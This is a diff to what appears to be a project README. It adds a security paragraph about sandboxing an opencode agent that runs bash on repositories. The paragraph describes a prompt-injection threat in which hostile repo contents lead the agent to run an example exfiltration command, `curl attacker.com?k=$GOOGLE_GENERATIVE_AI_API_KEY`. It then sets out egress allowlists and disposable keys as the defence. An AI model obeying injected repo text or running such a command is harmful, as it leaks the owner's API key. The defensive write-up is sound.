@@ -61,6 +61,8 @@ curl -H "Modal-Key: $MODAL_PROXY_TOKEN_ID" \
 
 Any client code that calls this server — scripts, CI jobs, another service — needs the same two headers. `GOOGLE_API_KEY` rides along via `Secret.from_name("looptap-secrets")` and the function forwards it into the subprocess env explicitly.
 
+**Sandbox egress is pinned, key hygiene still matters.** `POST /analyze-repo` runs opencode with `bash: allow` (that's what lets the agent run `git log`, `rg`, etc.), so an attacker who gets prompt-injection into a repo's contents could otherwise `curl attacker.com?k=$GOOGLE_GENERATIVE_AI_API_KEY`. The Modal sandbox is created with a `cidr_allowlist` covering only Google's Gemini endpoints — no github, no arbitrary hosts — and `/index-repo`'s sandbox is restricted to GitHub's CIDRs. Start tight; widen in `deploy/app.py` if a legitimate outbound call returns `network unreachable`. Belt-and-suspenders: still drop a rate-limited, short-lived, single-purpose Google AI Studio key into `looptap-secrets`, rotate on a schedule, and treat it as "a key you're willing to lose." Never drop your primary Gemini key in there.
+
 Browse the DB with datasette:
 
 ```bash
